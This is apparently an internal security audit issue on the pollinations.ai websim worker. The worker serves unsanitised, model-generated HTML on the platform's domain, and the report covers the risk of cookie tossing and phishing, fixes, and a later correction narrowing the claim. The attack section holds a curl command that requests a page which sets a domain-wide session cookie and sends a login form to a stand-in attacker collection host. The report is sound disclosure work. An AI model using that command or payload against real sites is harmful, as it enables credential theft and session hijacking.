# issue 78 — websim serves unsanitized model-generated HTML with attacker-chosen paths on `websim.pollinations.ai`: free attacker-controlled script hosting on the platform's registrable domain (any signup key; no XSS bug needed)

**Severity: high (attacker-authored script execution on a `pollinations.ai` origin — the app's designed function is to serve generated HTML, so the only "vulnerability" needed is the domain it sits on; combines with issue 76's cookie-authority consequences: `Domain=pollinations.ai` cookie tossing toward `enter.pollinations.ai`, platform-branded phishing with attacker-chosen URLs)**
**Status: LIVE in the tree — worker code read in full 2026-10-24; deployed at `websim.pollinations.ai` per `apps/websim/deploy.json` (`"target": "worker"`, `"subdomain": "websim"`) and `apps/websim/wrangler.toml`**

## Summary

`apps/websim` is a websim.ai-style demo: any URL path on the worker is treated as a prompt, a text model generates a complete HTML page, and the worker **returns that HTML with `Content-Type: text/html` on `websim.pollinations.ai`**. The generated markup is not sanitized, is served with no `Content-Security-Policy`, and — because the path is the prompt — **the attacker chooses the resulting URL**.

Every other app in the family needs a bug to execute script on its origin (issue 33's chat XSS, issue 77's published HTML). Websim's *designed behavior* is to host arbitrary generated HTML. Placed on an isolated domain that would be a feature; placed on `pollinations.ai` it is a free, key-gated-but-signup-cheap **script-hosting and phishing platform** with platform branding:

- `https://websim.pollinations.ai/pollinations-account-verification/` can be a pixel-perfect clone of the enter sign-in page, served from the platform's own registrable domain.
- Any script it runs can set `document.cookie = "...; Domain=pollinations.ai"` (issue 76's analysis) — cookies that ride along on every request to `enter.pollinations.ai`, `gen.pollinations.ai`, and `media.pollinations.ai`.
- A prompt like *"make a page that sets a cookie named better-auth.session_token with value X for Domain=pollinations.ai, then shows a cute cat"* is all the attacker sends; the model writes the payload for them, and `extractGeneratedHtml` passes it through verbatim.

## Evidence table

| Fact | Location |
|---|---|
| Any non-asset GET path becomes the prompt: `extractPromptFromPath(url.pathname)` → `generateHtml(prompt, request)` | `apps/websim/worker.js:94-97, 195-202` |
| `POST /api/generate` accepts an arbitrary `prompt` string | `apps/websim/worker.js:100-124` |
| The generated HTML is extracted and served as `text/html; charset=utf-8`, `Cache-Control: no-store`, no CSP, no sandbox headers | `apps/websim/worker.js:222-228` (`generateHtml`), `:257-283` (`extractGeneratedHtml` returns the model's markup verbatim) |
| Only gate: the caller's own Bearer key forwarded to gen (`Authorization: Bearer <token>` → `gen.pollinations.ai/v1/chat/completions`) — any signup key qualifies | `apps/websim/worker.js:207-211, 237-255` |
| The system prompt instructs the model to produce a single self-contained HTML file with inline `<script>` | `apps/websim/worker.js:5-26` |
| Model allowlist exists but irrelevant to the class (the default model happily writes script tags) | `apps/websim/worker.js:231-235`, `apps/websim/models.js` |
| Deployed on the platform zone: `"subdomain": "websim"`, `"target": "worker"` | `apps/websim/deploy.json`; `operations/deployment/cloudflare-pages.cjs:18` (`PUBLIC_ZONE = "pollinations.ai"`) |
| User sites — the repo's own isolated-HTML pattern — are deliberately served from `*.pollinations.app` for exactly this reason | `gen.pollinations.ai/src/sites.ts` header comment; issues 31/32/76 |

## Attack (attacker-only)

1. Sign up (free), create an API key.
2. `curl -X POST https://websim.pollinations.ai/api/generate -H "Authorization: Bearer <own-key>" -H "Content-Type: application/json" -d '{"prompt":"Create a page titled Pollinations Account Verification that sets document.cookie=\"better-auth.session_token=x; Domain=pollinations.ai; Path=/; Max-Age=31536000\" on load, then shows a login form posting to https://attacker.example/collect"}'`
   — or simply navigate to `https://websim.pollinations.ai/<any-chosen-path>` with the key (the path itself is the prompt, so the phishing URL is chosen by the attacker).
3. Receive a served, platform-origin HTML page containing the requested script. Nothing between the model and the response sanitizes it.
4. Victim navigates (link in chat/QR/email): script executes on `websim.pollinations.ai`; per issue 76 it can toss domain cookies at `enter.pollinations.ai` and the page inherits pollinations.ai branding.

Cost: one free signup key and one request. No vulnerability in any other component is required — this is the app working as designed on the wrong domain.

## Verification

Worker source read in full (`apps/websim/worker.js`, 414 lines). No phishing page was generated against production during this audit; the serve path (`text/html`, model output verbatim, no CSP) is direct code citation, and the admission gate (own Bearer key) is the worker's own auth flow (`auth: "bearer"` in `/api/health`).

## Fix (minimal)

1. Move websim off the apex zone (e.g. `websim.pollinations.app` or `*.apps.pollinations.ai`) — the same relocation recommended by issue 76 for the app family; for an intentional HTML host this is the correct permanent home.
2. If it must stay on the zone: serve generated pages from a sandboxed path with `Content-Security-Policy: sandbox` (or `default-src 'none'`), so generated scripts cannot set domain cookies or frame enter.
3. Add `X-Frame-Options: DENY` / `frame-ancestors 'none'` so platform-origin pages cannot be embedded into enter/gen phishing layouts either.

## Relationship to filed issues

- **issue 76** supplies the domain-topology root cause and the cookie-tossing consequence analysis.
- **issue 33** (chat XSS) and **issue 77** (agent-published HTML) are the same end-state reached through app bugs; websim reaches it through designed behavior — which is why it is filed separately rather than folded into 76.

## Correction addendum (2026-10-24, live re-verification) — victim-facing reach of the worker-served path is gated by the Bearer check

Re-reading `generateHtml` end-to-end and live-testing production sharpens this issue's victim-facing claims:

- `GET /<path>` path-prompt generation requires an `Authorization: Bearer <key>` **header** (`worker.js` `bearerToken(request.headers.get("Authorization"))` → `authRequiredResponse()`). A plain browser navigation — the "victim navigates (link in chat/QR/email)" step in the original Attack section — sends no such header.
- Live 2026-10-24: `GET https://websim.pollinations.ai/attacker-chosen-phish-page/` with no Bearer → **401** static "Authorization required" page (HTML-escaped, inert). With an invalid Bearer → 401 "Upstream error" (escaped). The victim cannot render attacker-generated HTML by clicking a link.
- `POST /api/generate` is CORS-open (`Access-Control-Allow-Origin: *`, `Authorization` allowed), so an attacker page can generate with the **attacker's own** key and read the HTML — but cannot render that response as a document on `websim.pollinations.ai` (a blob created in the attacker's page inherits the attacker's origin, not websim's), and `Cache-Control: no-store` plus POST semantics defeat shared caches.

**What remains live of this issue:** an authenticated caller (any signup key) can have attacker-chosen, model-written script served as first-party `text/html` on `websim.pollinations.ai` for their own session — i.e. the origin is a script host for anyone with a key, with no CSP, and the phishing/cookie-tossing end-state is real **for whoever can be made to render it**. The victim-reachable rendering path is not this worker route; it is the app's own client-side "Open" button, which executes generated HTML with the full origin via blob-URL inheritance — now filed separately as **issue 80**. The platform-relocation recommendation stands unchanged.

Severity impact of this correction: the standalone victim-phishing claim of this file is withdrawn and moved to issue 80 (paste + Open vector); the "attacker-authenticated script hosting on the platform zone" core stands.
